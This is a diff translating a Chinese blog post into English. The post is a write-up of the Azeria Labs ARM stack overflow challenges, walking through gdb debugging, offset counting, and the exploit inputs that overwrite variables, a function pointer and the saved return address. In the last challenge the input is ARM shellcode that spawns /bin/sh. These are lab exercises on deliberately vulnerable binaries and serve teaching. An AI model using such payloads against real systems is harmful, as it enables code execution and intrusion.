@@ -9,44 +9,44 @@ tags:
 comments: true
 ---
 
-最近学习了 <https://azeria-labs.com/> 出的ARM Exploit教程，最后作者出了几个挑战题目，以下是的解题思路。
+Recently learned ARM Exploit tutorial from <https://azeria-labs.com/>, author gave several challenge problems, below are solution approaches.
 
-题目在这： <https://azeria-labs.com/part-3-stack-overflow-challenges/>
+Problems here: <https://azeria-labs.com/part-3-stack-overflow-challenges/>
 
-# 环境
+# Environment
 
-1. 直接使用作者提供的虚拟机 <https://azeria-labs.com/arm-lab-vm/>
-2. armv6 树莓派
+1. Directly use author's provided virtual machine <https://azeria-labs.com/arm-lab-vm/>
+2. armv6 Raspberry Pi
 
 <!-- more -->
 
-# 题目 Stack1
+# Problem Stack1
 
 ```
 What you will learn
 
 How to modify variables to specific values in the program
 How the variables are laid out in memory
-Goal: Change the ‘modified’ variable. You solved the challenge once “You have changed the ‘modified’ variable” is printed out.
+Goal: Change the 'modified' variable. You solved the challenge once "You have changed the 'modified' variable" is printed out.
 ```
 
-## 初步运行
+## Initial Run
 
-先直接运行看看，
+First directly run to see,
 
 ```
 pi@raspberrypi:~/ARM-challenges $ ./stack1
 stack1: please specify an argument
 ```
 
-那就加个参数
+Then add an argument
 
 ```
 pi@raspberrypi:~/ARM-challenges $ ./stack1 1111111111111111
 Try again, you got 0x00000000
 ```
 
-再参数长点
+Make argument longer
 
 ```
 pi@raspberrypi:~/ARM-challenges $ ./stack1 111111111111111111111111111111111111111111111111111111111111111111111111111111
@@ -54,9 +54,9 @@ Try again, you got 0x31313131
 Segmentation fault
 ```
 
-哇，数值变了。0x31就是1啦。而且crash了。
+Wow, value changed. 0x31 is 1. And crashed.
 
-## 调试
+## Debugging
 
 ```
 gdb stack1
@@ -64,7 +64,7 @@ break main
 run
 ```
 
-输出汇编
+Output assembly
 
 ```
 gef> disassemble main
@@ -111,57 +111,57 @@ End of assembler dump.
 
 ```
 
-初步分析和调试下代码
+Preliminary analysis and debugging code
 
 ![](/media/15122339822130.jpg)
 
 
-上图红框中最关键的几行代码，只要满足 r3 r2 相等，就可以完成此题。调试发现 r2 每次都是0x61626364，字符串就是 `dcba`（小端）。
+Key lines in red box above, as long as r3 r2 are equal, can complete this problem. Debugging found r2 is always 0x61626364, string is `dcba` (little endian).
 
-r2是相对pc的偏移，一般就是代码中的常量了。r3是相对r11（也就是fp）偏移-8。现在重点到看看r11。
+r2 is relative to pc offset, generally constant in code. r3 is relative to r11 (that is fp) offset -8. Now focus on looking at r11.
 
-r11是Frame Pointer地址（栈底），sp是栈顶，一般函数内的变量可以通过fp取相对偏移获取。程序的输入参数也是这样。
+r11 is Frame Pointer address (stack bottom), sp is stack top, generally variables in function can be obtained through fp relative offset. Program's input parameters are also like this.
 
-从上面我们输入超长数据的结果可知，超长数据覆盖了 `[r11,#-8]`，那程序大概就是简单的把输入存到字符数组中。
+From result above where we input super long data, super long data overwrote `[r11,#-8]`, so program probably simply stores input into character array.
 
-根据`sub sp,sp,#80`看到栈大小有80字节，也就是20个word。而r11是 sp+4后的值，这样我们可以看下整个Frame上的数据，在加上main第一行push也让sp减8，因此总共23个word。（由于当时计算错误，下面的命令就只输出22个，不过也够用了）用命令 `x/22w $r11-84` 输出。
+According to `sub sp,sp,#80` see stack size is 80 bytes, that is 20 words. And r11 is value after sp+4, so can look at entire Frame's data, plus main first line push also makes sp decrease 8, so total 23 words. (Since calculation error at the time, command below only outputs 22, but enough) Use command `x/22w $r11-84` to output.
 
 ![](/media/15122365637942.jpg)
 
 
-也就是把上图右下角的数值改为 0x61626364 就好了。
-从第一个0x31313131算，需要17*4=64个字符，最后四个需要是`dcba`。
+That is change value at bottom right of figure above to 0x61626364.
+From first 0x31313131 count, need 17*4=64 characters, last four need to be `dcba`.
 
-这样试试
+Try this
 
 ![](/media/15122367482364.jpg)
 
 ![](/media/15122367796672.jpg)
 
-## 通过
+## Passed
 
-终于挑战通过。Yeah!
+Finally challenge passed. Yeah!
 
 ![](/media/15122368686347.jpg)
 
-就像题目所说，是为了熟悉下 How the variables are laid out in memory。
+Like problem says, is to familiarize How the variables are laid out in memory.
 
 
-# 题目 Stack2
+# Problem Stack2
 
-与上一题目差不多，只是输入方式变成了环境变量。
+Similar to previous problem, only input method changed to environment variable.
 
 ![](/media/15123013446710.jpg)
 
-断点到cmp指令可以看到，需要让环境变量最后的数值为\n\r\n\r。
+Breakpoint at cmp instruction can see, need to make environment variable's final value \n\r\n\r.
 
 ![](/media/15123014415309.jpg)
 
-也就是覆盖到上图的地址。从第一个0x31算下（假设输入是很多1111111），也就是需要17*4的字符，最后四个字符是`\n\r\n\r`。
+That is overwrite to address in figure above. From first 0x31 count (assuming input is many 1111111), that is need 17*4 characters, last four characters are `\n\r\n\r`.
 
-怎么设置环境变量是`\n\r`呢？参考Stack Overflow的回答 <https://stackoverflow.com/questions/41309822/how-do-i-actually-write-n-r-to-an-environment-variable>
+How to set environment variable to `\n\r`? Reference Stack Overflow answer <https://stackoverflow.com/questions/41309822/how-do-i-actually-write-n-r-to-an-environment-variable>
 
-以下答案都可以了：
+Following answers all work:
 
 ```
 export GREENIE=$'1111111111111111111111111111111111111111111111111111111111111111\n\r\n\r'
@@ -171,26 +171,26 @@ export GREENIE="$(python -c 'print "\n\r"*136')"
 ```
 
 
-# 题目 Stack3
+# Problem Stack3
 
 
 ![](/media/15123029483316.jpg)
 
-看到跳转到r3，也就是r11-8。
+See jump to r3, that is r11-8.
 
 ![](/media/15123034988550.jpg)
 
-可见就是要覆盖上图中的0x31313131，17*4的数据最后4个就是覆盖函数调用的地址。
+Can see is to overwrite 0x31313131 in figure above, 17*4 data's last 4 is overwrite function call address.
 
 ![](/media/15123036349068.jpg)
 
-覆盖为00 01 04 7c即可，由于小端，输入如下：
+Overwrite to 00 01 04 7c, since little endian, input:
 
 ```
 1111111111111111111111111111111111111111111111111111111111111111|\x04\x01\x00
 ```
 
-最终需要这样：
+Finally need:
 
 ```
 printf '1111111111111111111111111111111111111111111111111111111111111111|\x04\x01\x00' | ./stack3
@@ -199,23 +199,23 @@ printf '1111111111111111111111111111111111111111111111111111111111111111|\x04\x0
 ![](/media/15123481953215.jpg)
 
 
-# 题目 Stack4
+# Problem Stack4
 
 ![](/media/15123520903550.jpg)
 
-要覆盖pc，就是要覆盖最后的栈中存储lr的位置。
+To overwrite pc, is to overwrite lr stored in stack's final position.
 
 ![](/media/15123520264720.jpg)
 
 
-数组长度68，+4可以覆盖r11，再+4可以覆盖lr。
+Array length 68, +4 can overwrite r11, +4 more can overwrite lr.
 
 ![](/media/15123521883470.jpg)
 
 
-也就是覆盖最后4个字节为00 01 04 4c。
+That is overwrite last 4 bytes to 00 01 04 4c.
 
-答案就是：
+Answer is:
 
 
 ```
@@ -224,12 +224,12 @@ printf '11111111111111111111111111111111111111111111111111111111111111111111\x4c
 ![](/media/15123526858244.jpg)
 
 
-# 题目 Stack5
+# Problem Stack5
 
 
-先看代码与stack4一样，不同的是：这次我们要执行自己的shellcode。
+First see code same as stack4, difference is: this time we want to execute our own shellcode.
 
-shellcode 我们就用之前章节的 <https://azeria-labs.com/writing-arm-shellcode/>
+shellcode we use previous chapter's <https://azeria-labs.com/writing-arm-shellcode/>
 
 ```
 printf '11111111111111111111111111111111111111111111111111111111111111111111\x4c\x04\x01\x00' | ./stack5
@@ -238,7 +238,7 @@ printf '11111111111111111111111111111111111111111111111111111111111111111111\x4c
 
 ![](/media/15124064941002.jpg)
 
-由于要执行我们的shellcode，那把lr改为栈的下一个地址，然后后面存放shellcode。
+Since want to execute our shellcode, change lr to next address on stack, then store shellcode after.
 
 ```
 11111111111111111111111111111111111111111111111111111111111111111111
@@ -250,7 +250,7 @@ printf '11111111111111111111111111111111111111111111111111111111111111111111\x4c
 
 
 
-因此可以这样：
+Therefore can do:
 
 ```
 printf '11111111111111111111111111111111111111111111111111111111111111111111\xf0\xf1\xff\xbe\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x78' | ./stack5
